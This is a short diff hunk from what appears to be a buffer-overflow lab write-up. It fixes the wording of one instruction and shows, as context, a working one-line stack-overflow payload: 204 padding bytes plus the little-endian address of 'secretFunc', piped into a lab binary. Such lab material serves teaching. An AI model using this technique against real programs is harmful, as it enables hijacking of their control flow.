@@ -28,6 +28,6 @@ The address of 'secretFunc' is 0x0804846b
 To attack, based on the stackframe we need 204 bytes   
 To quit  
 `q`  
-To generate create 204 bytes by generate 204 character 'a'  
+To create 204 bytes by generate 204 characters 'a'  
 `echo $(python -c "print('a'*204+'\x6b\x84\x04\x08')") | ./bof1.out 123`
  ![alt text](image-4.png)
